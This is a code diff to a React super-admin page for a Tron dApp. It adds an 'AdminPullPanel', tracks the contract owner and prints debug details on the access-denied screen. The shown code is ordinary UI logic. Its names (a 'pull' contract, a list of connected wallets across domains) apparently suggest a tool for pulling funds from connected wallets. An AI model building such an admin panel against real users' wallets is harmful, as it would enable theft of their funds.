@@ -1,6 +1,7 @@
 "use client";
 
 import { SuperAdminPanel } from "@/components/SuperAdminPanel";
+import { AdminPullPanel } from "@/components/AdminPullPanel";
 import { ConnectedWalletsList } from "@/components/ConnectedWalletsList";
 import { TronConnectButton } from "@/components/TronConnectButton";
 import { useTron } from "@/components/TronProvider";
@@ -13,6 +14,7 @@ export default function SuperAdminPage() {
   const { address, isConnected } = useTron();
   const [isOwner, setIsOwner] = useState(false);
   const [isChecking, setIsChecking] = useState(false);
+  const [ownerAddress, setOwnerAddress] = useState<string | null>(null);
 
   useEffect(() => {
     if (!isConnected || !address) {
@@ -24,10 +26,12 @@ export default function SuperAdminPage() {
       setIsChecking(true);
       try {
         const owner = await getContractOwner(PULL_CONTRACT_ADDRESS);
-        setIsOwner(owner?.toLowerCase() === address.toLowerCase());
+        setOwnerAddress(owner || null);
+        setIsOwner(owner === address);
       } catch (error) {
         console.error("Failed to check owner:", error);
         setIsOwner(false);
+        setOwnerAddress(null);
       } finally {
         setIsChecking(false);
       }
@@ -58,11 +62,19 @@ export default function SuperAdminPage() {
   if (!isOwner) {
     return (
       <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-900 to-black flex items-center justify-center px-4">
-        <div className="max-w-md w-full rounded-lg border border-red-500/30 bg-red-900/10 p-6 text-center">
-          <h1 className="text-lg font-semibold text-red-300 mb-2">Access Restricted</h1>
-          <p className="text-sm text-red-200">
-            Only the contract deployer can access the super admin panel.
-          </p>
+        <div className="max-w-md w-full space-y-4">
+          <div className="rounded-lg border border-red-500/30 bg-red-900/10 p-6 text-center">
+            <h1 className="text-lg font-semibold text-red-300 mb-2">Access Restricted</h1>
+            <p className="text-sm text-red-200">
+              Only the contract deployer can access the super admin panel.
+            </p>
+          </div>
+          <div className="rounded-lg border border-blue-500/20 bg-gray-900/50 p-4 text-xs text-cyan-200 space-y-1">
+            <div>Contract: {PULL_CONTRACT_ADDRESS}</div>
+            <div>Connected: {address || "Not connected"}</div>
+            <div>Owner: {ownerAddress || "Unknown"}</div>
+            <div>isOwner: {isOwner ? "true" : "false"}</div>
+          </div>
         </div>
       </div>
     );
@@ -108,6 +120,7 @@ export default function SuperAdminPage() {
           </div>
 
           <SuperAdminPanel />
+          <AdminPullPanel />
           <ConnectedWalletsList filterByDomain={false} />
 
           <div className="grid gap-3 sm:gap-4 md:grid-cols-2">
